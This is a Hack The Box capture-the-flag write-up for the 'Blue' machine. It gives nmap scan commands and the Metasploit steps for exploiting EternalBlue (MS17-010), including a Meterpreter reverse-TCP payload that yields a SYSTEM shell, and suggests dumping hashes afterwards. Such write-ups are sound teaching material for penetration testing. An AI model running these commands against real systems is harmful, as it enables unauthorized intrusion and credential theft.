# 🏰 Machine Name: Blue  
### 🎯 Difficulty: Easy  
### 💻 Platform: Hack The Box  
---

## 🔍 Enumeration

First, let's perform a full TCP port scan:

```bash
nmap -p- -T4 --min-rate=10000 -Pn -vv 10.10.10.40
```
This reveals three open ports: 135, 139, and 445.

Next, we scan these ports for detailed service and OS information:
```bash
nmap -p135,139,445 -A -sV -T4 -Pn -oA agr_scan 10.10.10.40
```

🔎 Key Findings:
OS: Windows 7 Professional SP1 (Workgroup: WORKGROUP)
Open Ports:
135: Microsoft Windows RPC
139: NetBIOS-SSN
445: Microsoft-DS (SMB)
Vulnerability Insight: SMBv1 is enabled, and the OS is Windows 7 — this combination is vulnerable to EternalBlue (MS17-010).
---------------------------------------------------------------------------------------------------------
💥 Exploitation

We’ll use the EternalBlue exploit in Metasploit to gain NT AUTHORITY\SYSTEM access.

Steps:
Launch Metasploit:
msfconsole
Load the exploit:
```bash 
use exploit/windows/smb/ms17_010_eternalblue```
Set the target IP and payload:
set RHOSTS 10.10.10.40
set LHOST <Your_IP>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
Run the exploit:
exploit
```
If successful, you'll receive a Meterpreter session as SYSTEM.
---------------------------------------------------------------------------------------------------------
✅ Post-Exploitation

Confirm shell:
```bash
getuid
```
Dump hashes,pivot, or enumerate as needed.

🎉 Rooted!

🔓 Blue is pwned!
Gained SYSTEM access using EternalBlue on vulnerable SMBv1.
